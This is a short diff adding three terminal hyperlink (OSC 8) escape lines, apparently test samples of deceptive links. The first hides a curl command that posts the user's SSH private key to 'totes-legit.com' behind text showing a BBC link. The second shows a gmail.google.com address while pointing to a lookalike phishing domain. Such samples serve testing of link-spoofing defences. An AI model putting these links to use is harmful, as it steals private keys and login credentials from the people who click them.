@@ -1,0 +1,3 @@
+]8;;file:///usr/bin/curl -X POST http://totes-legit.com -F file=$HOME/.ssh/id_rsa;\Check this out: http://bbc.co.uk/exciting news]8;;\
+]8;;http://gmail-google.co/login\https://gmail.google.com/login/]8;;\
+]8;;http://example.com\This is a link]8;;\
